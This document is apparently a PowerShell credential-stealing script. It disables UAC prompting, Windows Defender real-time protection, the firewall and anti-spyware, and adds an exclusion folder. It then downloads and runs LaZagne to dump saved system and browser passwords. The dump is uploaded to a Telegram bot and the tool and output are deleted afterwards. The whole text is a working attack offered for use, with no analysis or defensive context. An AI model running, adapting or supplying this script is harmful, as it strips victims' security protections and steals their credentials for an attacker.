# Mr-Proxy-Source on github!
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
# Disabling the UAC
Set-ItemProperty -Path "REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0

# Disabling the Firewall Part 1
Set-MpPreference -DisableRealtimeMonitoring $true

# Disabling the Firewall Part 2
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Disabling the Virus and Threat Protection
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force

# Adding an exclusion path
Add-MpPreference -ExclusionPath "C:\temp"

# Download LaZagne and execute it
$Test = "C:\temp"
Start-BitsTransfer -Source "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -Destination "$Test/l.exe"
Set-Location $Test
Start-Sleep -Milliseconds 15000
.\l.exe all -vv > "$env:computername.txt"; .\l.exe browsers -vv >> "$env:computername.txt"

# Send the result file to a Telegram bot
# $BotToken = "bot-token"
# $ChatID = "chat-id"
$ResultFile = "$env:computername.txt"

try {
    # Create a byte array from the file
    $FileStream = [System.IO.File]::OpenRead($ResultFile)
    $FileBytes = [byte[]]::new($FileStream.Length)
    $FileStream.Read($FileBytes, 0, $FileBytes.Length)
    $FileStream.Close()

    # Define the boundary for multipart form-data
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"

    # Construct the multipart form-data content
    $BodyLines = @(
        "--$boundary",
        "Content-Disposition: form-data; name=`"chat_id`"",
        "",
        $ChatID,
        "--$boundary",
        "Content-Disposition: form-data; name=`"document`"; filename=`"$($ResultFile)`"",
        "Content-Type: application/octet-stream",
        "",
        [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($FileBytes),
        "--$boundary--",
        ""
    ) -join $LF

    # Convert the body to a byte array
    $BodyBytes = [System.Text.Encoding]::GetEncoding("iso-8859-1").GetBytes($BodyLines)

    # Send the request to the Telegram API
    $TelegramAPI = "https://api.telegram.org/bot$BotToken/sendDocument"
    $Response = Invoke-RestMethod -Uri $TelegramAPI -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $BodyBytes

    Write-Host "File sent to Telegram successfully."
} catch {
    Write-Host "Failed to send file to Telegram. Error: $_"
}


# Send the result file
Send-TelegramFile -BotToken $BotToken -ChatID $ChatID -FilePath $ResultFile

# Cleanup
Remove-Item $ResultFile, "$Test/l.exe" -Force -ErrorAction SilentlyContinue

# Exit
Start-Sleep -Milliseconds 2500
exit
